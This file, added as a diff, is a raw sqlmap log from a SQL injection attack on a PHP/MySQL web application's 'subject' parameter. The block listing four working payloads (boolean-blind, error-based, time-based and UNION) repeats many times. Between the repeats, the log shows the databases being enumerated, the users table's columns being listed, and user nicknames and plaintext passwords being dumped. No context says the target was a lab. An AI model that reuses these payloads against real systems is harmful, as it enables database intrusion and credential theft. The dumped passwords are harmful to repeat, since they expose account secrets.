@@ -1,0 +1,412 @@
+sqlmap identified the following injection point(s) with a total of 76 HTTP(s) requests:
+---
+Parameter: subject (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: subject=2 AND 2445=2445
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: subject=2 AND (SELECT 8384 FROM(SELECT COUNT(*),CONCAT(0x7171787171,(SELECT (ELT(8384=8384,1))),0x7176717071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: subject=2 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: subject=2 UNION ALL SELECT 36,36,36,36,36,36,CONCAT(0x7171787171,0x484a506769656247454b564e624a50556650584f67716a626b4f725666735772677a4b5a48707656,0x7176717071),36-- MPoh
+---
+web application technology: PHP 5.5.22, Apache 2
+back-end DBMS: MySQL >= 5.0
+available databases [3]:
+[*] aqua
+[*] diyhtml
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: subject (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: subject=2 AND 2445=2445
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: subject=2 AND (SELECT 8384 FROM(SELECT COUNT(*),CONCAT(0x7171787171,(SELECT (ELT(8384=8384,1))),0x7176717071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: subject=2 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: subject=2 UNION ALL SELECT 36,36,36,36,36,36,CONCAT(0x7171787171,0x484a506769656247454b564e624a50556650584f67716a626b4f725666735772677a4b5a48707656,0x7176717071),36-- MPoh
+---
+web application technology: PHP 5.5.22, Apache 2
+back-end DBMS: MySQL >= 5.0
+available databases [3]:
+[*] aqua
+[*] diyhtml
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: subject (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: subject=2 AND 2445=2445
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: subject=2 AND (SELECT 8384 FROM(SELECT COUNT(*),CONCAT(0x7171787171,(SELECT (ELT(8384=8384,1))),0x7176717071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: subject=2 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: subject=2 UNION ALL SELECT 36,36,36,36,36,36,CONCAT(0x7171787171,0x484a506769656247454b564e624a50556650584f67716a626b4f725666735772677a4b5a48707656,0x7176717071),36-- MPoh
+---
+web application technology: PHP 5.5.22, Apache 2
+back-end DBMS: MySQL >= 5.0
+Database: diyhtml
+[4 tables]
++-------------+
+| accessories |
+| guides      |
+| subjects    |
+| users       |
++-------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: subject (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: subject=2 AND 2445=2445
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: subject=2 AND (SELECT 8384 FROM(SELECT COUNT(*),CONCAT(0x7171787171,(SELECT (ELT(8384=8384,1))),0x7176717071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: subject=2 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: subject=2 UNION ALL SELECT 36,36,36,36,36,36,CONCAT(0x7171787171,0x484a506769656247454b564e624a50556650584f67716a626b4f725666735772677a4b5a48707656,0x7176717071),36-- MPoh
+---
+web application technology: PHP 5.5.22, Apache 2
+back-end DBMS: MySQL >= 5.0
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: subject (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: subject=2 AND 2445=2445
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: subject=2 AND (SELECT 8384 FROM(SELECT COUNT(*),CONCAT(0x7171787171,(SELECT (ELT(8384=8384,1))),0x7176717071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: subject=2 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: subject=2 UNION ALL SELECT 36,36,36,36,36,36,CONCAT(0x7171787171,0x484a506769656247454b564e624a50556650584f67716a626b4f725666735772677a4b5a48707656,0x7176717071),36-- MPoh
+---
+web application technology: PHP 5.5.22, Apache 2
+back-end DBMS: MySQL >= 5.0
+Database: diyhtml
+Table: users
+[8 columns]
++-----------+---------+
+| Column    | Type    |
++-----------+---------+
+| country   | text    |
+| email     | text    |
+| firstname | text    |
+| id        | int(11) |
+| lastname  | text    |
+| nickname  | text    |
+| password  | text    |
+| type      | text    |
++-----------+---------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: subject (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: subject=2 AND 2445=2445
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: subject=2 AND (SELECT 8384 FROM(SELECT COUNT(*),CONCAT(0x7171787171,(SELECT (ELT(8384=8384,1))),0x7176717071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: subject=2 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: subject=2 UNION ALL SELECT 36,36,36,36,36,36,CONCAT(0x7171787171,0x484a506769656247454b564e624a50556650584f67716a626b4f725666735772677a4b5a48707656,0x7176717071),36-- MPoh
+---
+web application technology: PHP 5.5.22, Apache 2
+back-end DBMS: MySQL >= 5.0
+Database: diyhtml
+Table: users
+[3 entries]
++----------+
+| nickname |
++----------+
+| bob      |
+| boze     |
+| boze2    |
++----------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: subject (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: subject=2 AND 2445=2445
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: subject=2 AND (SELECT 8384 FROM(SELECT COUNT(*),CONCAT(0x7171787171,(SELECT (ELT(8384=8384,1))),0x7176717071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: subject=2 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: subject=2 UNION ALL SELECT 36,36,36,36,36,36,CONCAT(0x7171787171,0x484a506769656247454b564e624a50556650584f67716a626b4f725666735772677a4b5a48707656,0x7176717071),36-- MPoh
+---
+web application technology: PHP 5.5.22, Apache 2
+back-end DBMS: MySQL >= 5.0
+Database: diyhtml
+Table: users
+[3 entries]
++----------+
+| password |
++----------+
+| 123      |
+| 1234     |
+| boze!qaz |
++----------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: subject (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: subject=2 AND 2445=2445
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: subject=2 AND (SELECT 8384 FROM(SELECT COUNT(*),CONCAT(0x7171787171,(SELECT (ELT(8384=8384,1))),0x7176717071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: subject=2 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: subject=2 UNION ALL SELECT 36,36,36,36,36,36,CONCAT(0x7171787171,0x484a506769656247454b564e624a50556650584f67716a626b4f725666735772677a4b5a48707656,0x7176717071),36-- MPoh
+---
+web application technology: PHP 5.5.22, Apache 2
+back-end DBMS: MySQL >= 5.0
+available databases [3]:
+[*] aqua
+[*] diyhtml
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: subject (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: subject=2 AND 2445=2445
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: subject=2 AND (SELECT 8384 FROM(SELECT COUNT(*),CONCAT(0x7171787171,(SELECT (ELT(8384=8384,1))),0x7176717071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: subject=2 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: subject=2 UNION ALL SELECT 36,36,36,36,36,36,CONCAT(0x7171787171,0x484a506769656247454b564e624a50556650584f67716a626b4f725666735772677a4b5a48707656,0x7176717071),36-- MPoh
+---
+web application technology: PHP 5.5.22, Apache 2
+back-end DBMS: MySQL >= 5.0
+available databases [3]:
+[*] aqua
+[*] diyhtml
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: subject (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: subject=2 AND 2445=2445
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: subject=2 AND (SELECT 8384 FROM(SELECT COUNT(*),CONCAT(0x7171787171,(SELECT (ELT(8384=8384,1))),0x7176717071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: subject=2 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: subject=2 UNION ALL SELECT 36,36,36,36,36,36,CONCAT(0x7171787171,0x484a506769656247454b564e624a50556650584f67716a626b4f725666735772677a4b5a48707656,0x7176717071),36-- MPoh
+---
+web application technology: PHP 5.5.22, Apache 2
+back-end DBMS: MySQL >= 5.0
+available databases [3]:
+[*] aqua
+[*] diyhtml
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: subject (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: subject=2 AND 2445=2445
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: subject=2 AND (SELECT 8384 FROM(SELECT COUNT(*),CONCAT(0x7171787171,(SELECT (ELT(8384=8384,1))),0x7176717071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: subject=2 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: subject=2 UNION ALL SELECT 36,36,36,36,36,36,CONCAT(0x7171787171,0x484a506769656247454b564e624a50556650584f67716a626b4f725666735772677a4b5a48707656,0x7176717071),36-- MPoh
+---
+web application technology: PHP 5.5.22, Apache 2
+back-end DBMS: MySQL >= 5.0
+available databases [3]:
+[*] aqua
+[*] diyhtml
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: subject (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: subject=2 AND 2445=2445
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: subject=2 AND (SELECT 8384 FROM(SELECT COUNT(*),CONCAT(0x7171787171,(SELECT (ELT(8384=8384,1))),0x7176717071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: subject=2 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: subject=2 UNION ALL SELECT 36,36,36,36,36,36,CONCAT(0x7171787171,0x484a506769656247454b564e624a50556650584f67716a626b4f725666735772677a4b5a48707656,0x7176717071),36-- MPoh
+---
+web application technology: PHP 5.5.22, Apache 2
+back-end DBMS: MySQL >= 5.0
+available databases [3]:
+[*] aqua
+[*] diyhtml
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: subject (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: subject=2 AND 2445=2445
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: subject=2 AND (SELECT 8384 FROM(SELECT COUNT(*),CONCAT(0x7171787171,(SELECT (ELT(8384=8384,1))),0x7176717071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: subject=2 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: subject=2 UNION ALL SELECT 36,36,36,36,36,36,CONCAT(0x7171787171,0x484a506769656247454b564e624a50556650584f67716a626b4f725666735772677a4b5a48707656,0x7176717071),36-- MPoh
+---
+web application technology: PHP 5.5.22, Apache 2
+back-end DBMS: MySQL >= 5.0
+available databases [3]:
+[*] aqua
+[*] diyhtml
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: subject (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: subject=2 AND 2445=2445
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: subject=2 AND (SELECT 8384 FROM(SELECT COUNT(*),CONCAT(0x7171787171,(SELECT (ELT(8384=8384,1))),0x7176717071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: subject=2 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: subject=2 UNION ALL SELECT 36,36,36,36,36,36,CONCAT(0x7171787171,0x484a506769656247454b564e624a50556650584f67716a626b4f725666735772677a4b5a48707656,0x7176717071),36-- MPoh
+---
+web application technology: PHP 5.5.22, Apache 2
+back-end DBMS: MySQL >= 5.0
+available databases [3]:
+[*] aqua
+[*] diyhtml
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: subject (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: subject=2 AND 2445=2445
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: subject=2 AND (SELECT 8384 FROM(SELECT COUNT(*),CONCAT(0x7171787171,(SELECT (ELT(8384=8384,1))),0x7176717071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: subject=2 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: subject=2 UNION ALL SELECT 36,36,36,36,36,36,CONCAT(0x7171787171,0x484a506769656247454b564e624a50556650584f67716a626b4f725666735772677a4b5a48707656,0x7176717071),36-- MPoh
+---
+web application technology: PHP 5.5.22, Apache 2
+back-end DBMS: MySQL >= 5.0
+available databases [3]:
+[*] aqua
+[*] diyhtml
+[*] information_schema
+
